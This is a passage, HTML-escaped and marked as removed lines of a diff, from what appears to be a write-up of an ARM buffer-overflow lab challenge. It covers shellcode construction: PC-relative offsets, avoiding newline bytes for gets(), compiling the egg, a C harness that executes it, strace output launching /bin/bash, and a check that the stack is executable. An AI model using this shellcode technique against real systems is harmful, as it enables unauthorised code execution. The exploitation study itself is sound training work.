-&lt;span class=&quot;mi&quot;&gt;00000078&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Largv2&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;:&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;The &lt;code class=&quot;highlighter-rouge&quot;&gt;add&lt;/code&gt; instructions like &lt;code class=&quot;highlighter-rouge&quot;&gt;add r2, pc, #76&lt;/code&gt; makes the address relative
-to the program counter.&lt;/p&gt;
-
-&lt;p&gt;To calculate the offset to a label like &lt;code class=&quot;highlighter-rouge&quot;&gt;Largv0&lt;/code&gt; we need to subtract
-the address of the label minus the current position minus 8 bytes
-(because &lt;code class=&quot;highlighter-rouge&quot;&gt;pc&lt;/code&gt; already has an implicit +0x8)&lt;/p&gt;
-
-&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;    &lt;span class=&quot;mh&quot;&gt;0x78&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x24&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x8&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x4c&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;76&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Thankfully the assembler can do the calculus by us:&lt;/p&gt;
-
-&lt;div class=&quot;language-nasm highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;    &lt;span class=&quot;k&quot;&gt;add&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;r2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Largv2&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;8&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;And the branches?&lt;/p&gt;
-
-&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;bne Lparent_or_error&lt;/code&gt; is a &lt;em&gt;PC-relative&lt;/em&gt; encoded jump: the program will jump
-to that &lt;em&gt;absolute&lt;/em&gt; address but the instruction is encoded as an &lt;em&gt;offset&lt;/em&gt;
-from the current &lt;code class=&quot;highlighter-rouge&quot;&gt;pc&lt;/code&gt;.&lt;/p&gt;
-
-&lt;p&gt;In other words, we are &lt;strong&gt;not&lt;/strong&gt; hardcoding a fixed address so our code
-will work regardless of where is going to be loaded.&lt;/p&gt;
-
-&lt;div class=&quot;language-nasm highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;mi&quot;&gt;00000000&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;egg&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;:&lt;/span&gt;
-   &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;   &lt;span class=&quot;n&quot;&gt;e3a07002&lt;/span&gt;        &lt;span class=&quot;k&quot;&gt;mov&lt;/span&gt;     &lt;span class=&quot;n&quot;&gt;r7&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;
-   &lt;span class=&quot;mi&quot;&gt;4&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;   &lt;span class=&quot;n&quot;&gt;ef000000&lt;/span&gt;        &lt;span class=&quot;n&quot;&gt;svc&lt;/span&gt;     &lt;span class=&quot;mh&quot;&gt;0x00000000&lt;/span&gt;
-   &lt;span class=&quot;mi&quot;&gt;8&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;   &lt;span class=&quot;n&quot;&gt;e3500000&lt;/span&gt;        &lt;span class=&quot;k&quot;&gt;cmp&lt;/span&gt;     &lt;span class=&quot;n&quot;&gt;r0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;
-   &lt;span class=&quot;n&quot;&gt;c&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;   &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;a000000&lt;/span&gt;        &lt;span class=&quot;n&quot;&gt;bne&lt;/span&gt;     &lt;span class=&quot;mi&quot;&gt;14&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Lparent_or_error&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;
-  &lt;span class=&quot;mi&quot;&gt;10&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;   &lt;span class=&quot;n&quot;&gt;ea000002&lt;/span&gt;        &lt;span class=&quot;n&quot;&gt;b&lt;/span&gt;       &lt;span class=&quot;mi&quot;&gt;20&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Lchild&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;
-        &lt;span class=&quot;p&quot;&gt;....&lt;/span&gt;            &lt;span class=&quot;p&quot;&gt;....&lt;/span&gt;
-&lt;span class=&quot;mi&quot;&gt;00000020&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Lchild&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;:&lt;/span&gt;
-  &lt;span class=&quot;mi&quot;&gt;20&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;   &lt;span class=&quot;n&quot;&gt;e3a03000&lt;/span&gt;        &lt;span class=&quot;k&quot;&gt;mov&lt;/span&gt;     &lt;span class=&quot;n&quot;&gt;r3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;The address is computed as:&lt;/p&gt;
-
-&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;    &lt;span class=&quot;n&quot;&gt;pc&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;offset&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;4&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;8&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;The branch at 0x10 has the offset 0x02 encoded in the instruction
-0xea000002. Knowing that the offset is multiplied by 4 (because the
-addresses are aligned to 4 bytes; 2 in Thumb mode),
-and knowing that using &lt;code class=&quot;highlighter-rouge&quot;&gt;pc&lt;/code&gt; adds a 0x8 to the count
-(0x4 in Thumb mode), the final address is:&lt;/p&gt;
-
-&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;    &lt;span class=&quot;mh&quot;&gt;0x10&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x2&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;4&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x8&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x20&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Why did I use &lt;code class=&quot;highlighter-rouge&quot;&gt;bne&lt;/code&gt; instead of &lt;code class=&quot;highlighter-rouge&quot;&gt;beq&lt;/code&gt; ? Wouldn’t that be more direct?&lt;/p&gt;
-
-&lt;h2 id=&quot;forbidden-bytes&quot;&gt;Forbidden bytes&lt;/h2&gt;
-
-&lt;p&gt;The vulnerable program will read our exploit using &lt;code class=&quot;highlighter-rouge&quot;&gt;gets&lt;/code&gt;.&lt;/p&gt;
-
-&lt;p&gt;From the &lt;a href=&quot;https://man7.org/linux/man-pages/man3/gets.3.html&quot;&gt;man pages&lt;/a&gt;,
-&lt;code class=&quot;highlighter-rouge&quot;&gt;gets&lt;/code&gt; reads from &lt;code class=&quot;highlighter-rouge&quot;&gt;stdin&lt;/code&gt; until it finds a &lt;em&gt;termination character&lt;/em&gt; or it
-is the end of the stream.&lt;/p&gt;
-
-&lt;p&gt;In Linux, the new line (&lt;code class=&quot;highlighter-rouge&quot;&gt;\n&lt;/code&gt; 0x0a) is the &lt;em&gt;termination character&lt;/em&gt; so our
-payload cannot have this byte or &lt;code class=&quot;highlighter-rouge&quot;&gt;gets&lt;/code&gt; will stop in the middle of the copy.&lt;/p&gt;
-
-&lt;p&gt;For example the simple snippet is forbidden:&lt;/p&gt;
-
-&lt;div class=&quot;language-nasm highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;    &lt;span class=&quot;k&quot;&gt;cmp&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;r0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;
-    &lt;span class=&quot;n&quot;&gt;beq&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Lchild&lt;/span&gt;
-    &lt;span class=&quot;err&quot;&gt;@&lt;/span&gt;&lt;span class=&quot;c&quot;&gt;; code for parent or error follows&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;&lt;label for=&quot;mn-328106b3fb06798d7bb537aa8abb437f&quot; class=&quot;margin-toggle&quot;&gt; ⊕&lt;/label&gt;&lt;input type=&quot;checkbox&quot; id=&quot;mn-328106b3fb06798d7bb537aa8abb437f&quot; class=&quot;margin-toggle&quot; /&gt;&lt;span class=&quot;marginnote&quot;&gt;Bypassing the filters can be incredible complex. Here is article about
-&lt;a href=&quot;https://web.archive.org/web/2020*/http://www.phrack.org/issues/66/12.html&quot;&gt;Alphanumeric RISC ARM Shellcode&lt;/a&gt;.
- &lt;/span&gt;&lt;/p&gt;
-
-&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;beq&lt;/code&gt; has a 0x0a as the first byte so we have to rewrite the snippet
-to:&lt;/p&gt;
-
-&lt;div class=&quot;language-nasm highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;    &lt;span class=&quot;k&quot;&gt;cmp&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;r0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;
-    &lt;span class=&quot;n&quot;&gt;bne&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Lparent_or_error&lt;/span&gt;
-    &lt;span class=&quot;n&quot;&gt;b&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Lchild&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;h2 id=&quot;compilation&quot;&gt;Compilation&lt;/h2&gt;
-
-&lt;p&gt;We compile the assembly into an object file with &lt;code class=&quot;highlighter-rouge&quot;&gt;gcc&lt;/code&gt; (in a Raspbian)
-and then we extract the &lt;code class=&quot;highlighter-rouge&quot;&gt;.text&lt;/code&gt; section:&lt;/p&gt;
-
-&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;pi@raspberrypi:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;gcc &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-o&lt;/span&gt; egg.o egg.s
-pi@raspberrypi:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;objcopy &lt;span class=&quot;nt&quot;&gt;-O&lt;/span&gt; binary &lt;span class=&quot;nt&quot;&gt;--only-section&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;.text egg.o egg.text
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;The assembly can be found &lt;a href=&quot;/book-of-gehn/assets/azeria-arm-challenges-assets/egg.s&quot;&gt;here&lt;/a&gt;.&lt;/p&gt;
-
-&lt;h2 id=&quot;testing&quot;&gt;Testing&lt;/h2&gt;
-
-&lt;p&gt;It is always a good idea to test the shellcode &lt;em&gt;separately&lt;/em&gt; from the
-exploitation.&lt;/p&gt;
-
-&lt;p&gt;For this &lt;a href=&quot;/book-of-gehn/assets/azeria-arm-challenges-assets/test-egg.c&quot;&gt;we can create a small C program&lt;/a&gt;
-to load the &lt;em&gt;egg&lt;/em&gt; from a file
-into a buffer with &lt;em&gt;permission for execution&lt;/em&gt; and then jump into it:&lt;/p&gt;
-
-&lt;div class=&quot;language-cpp highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;    &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;buf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
-
-    &lt;span class=&quot;n&quot;&gt;posix_memalign&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;buf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ALIGN&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;fsize&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
-    &lt;span class=&quot;n&quot;&gt;fread&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;buf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;fsize&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;f&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
-    &lt;span class=&quot;n&quot;&gt;mprotect&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;buf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;fsize&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;PROT_READ&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;|&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;PROT_WRITE&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;|&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;PROT_EXEC&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
-
-    &lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)())&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;buf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)();&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;This is an example:&lt;/p&gt;
-
-&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;pi@raspberrypi:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;./test-egg egg.text
-Egg loaded at 0x24000-0x2409
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;&lt;label for=&quot;mn-7e40faf5a3bb8233e36e4d3e592de11d&quot; class=&quot;margin-toggle&quot;&gt; ⊕&lt;/label&gt;&lt;input type=&quot;checkbox&quot; id=&quot;mn-7e40faf5a3bb8233e36e4d3e592de11d&quot; class=&quot;margin-toggle&quot; /&gt;&lt;span class=&quot;marginnote&quot;&gt;The &lt;code class=&quot;highlighter-rouge&quot;&gt;good&lt;/code&gt; and &lt;code class=&quot;highlighter-rouge&quot;&gt;bad&lt;/code&gt; labels were put by me. Sorry, &lt;code class=&quot;highlighter-rouge&quot;&gt;strace&lt;/code&gt; is not so smart.
- &lt;/span&gt;&lt;/p&gt;
-
-&lt;p&gt;If the things don’t result as expected, &lt;code class=&quot;highlighter-rouge&quot;&gt;strace&lt;/code&gt; can be useful to
-inspect what syscalls are being called and with which parameters:&lt;/p&gt;
-
-&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;pi&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;@&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;raspberrypi&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;~&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;$&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;strace&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;./&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;test&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;egg&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;egg&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;text&lt;/span&gt;
-&lt;span class=&quot;o&quot;&gt;....&lt;/span&gt;
-&lt;span class=&quot;n&quot;&gt;strace&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Process&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;4959&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;attached&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;---&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;child&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;process&lt;/span&gt;
-&lt;span class=&quot;n&quot;&gt;execve&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;/bin/bash&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x6e69622f&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;...&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x666f&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;],&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x2407f&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;EFAULT&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Bad&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;address&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-           &lt;span class=&quot;o&quot;&gt;^&lt;/span&gt;            &lt;span class=&quot;o&quot;&gt;^&lt;/span&gt;
-         &lt;span class=&quot;n&quot;&gt;good&lt;/span&gt;          &lt;span class=&quot;n&quot;&gt;bad&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;h2 id=&quot;search-a-home&quot;&gt;Search a home&lt;/h2&gt;
-
-&lt;p&gt;Fortunately the stack is executable:&lt;/p&gt;
-
-&lt;div class=&quot;language-nasm highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;pwndbg&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;vmmap&lt;/span&gt;
-   &lt;span class=&quot;mh&quot;&gt;0x10000&lt;/span&gt;    &lt;span class=&quot;mh&quot;&gt;0x11000&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;xp&lt;/span&gt;     &lt;span class=&quot;mi&quot;&gt;1000&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;      &lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;home&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pi&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;stack5&lt;/span&gt;
-   &lt;span class=&quot;mh&quot;&gt;0x20000&lt;/span&gt;    &lt;span class=&quot;mh&quot;&gt;0x21000&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;rwxp&lt;/span&gt;     &lt;span class=&quot;mi&quot;&gt;1000&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;      &lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;home&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pi&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;stack5&lt;/span&gt;
-&lt;span class=&quot;mh&quot;&gt;0xb6fcc000&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0xb6fec000&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;xp&lt;/span&gt;    &lt;span class=&quot;mi&quot;&gt;20000&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;      &lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;usr&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;lib&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;arm&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;linux&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;gnueabihf&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ld&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;28&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;so&lt;/span&gt;
-&lt;span class=&quot;mh&quot;&gt;0xb6ffc000&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0xb6ffe000&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;rwxp&lt;/span&gt;     &lt;span class=&quot;mi&quot;&gt;2000&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;20000&lt;/span&gt;  &lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;usr&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;lib&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;arm&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;linux&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;gnueabihf&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ld&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;28&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;so&lt;/span&gt;
-&lt;span class=&quot;mh&quot;&gt;0xb6fff000&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0xb7000000&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;xp&lt;/span&gt;     &lt;span class=&quot;mi&quot;&gt;1000&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;      &lt;span class=&quot;p&quot;&gt;[sigpage]&lt;/span&gt;
-&lt;span class=&quot;mh&quot;&gt;0xbefdf000&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0xbf000000&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;rwxp&lt;/span&gt;    &lt;span class=&quot;mi&quot;&gt;21000&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;      &lt;span class=&quot;p&quot;&gt;[stack]&lt;/span&gt;
-&lt;span class=&quot;mh&quot;&gt;0xffff0000&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0xffff1000&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;xp&lt;/span&gt;     &lt;span class=&quot;mi&quot;&gt;1000&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;      &lt;span class=&quot;p&quot;&gt;[vectors]&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;We can write the egg in the stack and then jump to it. The content
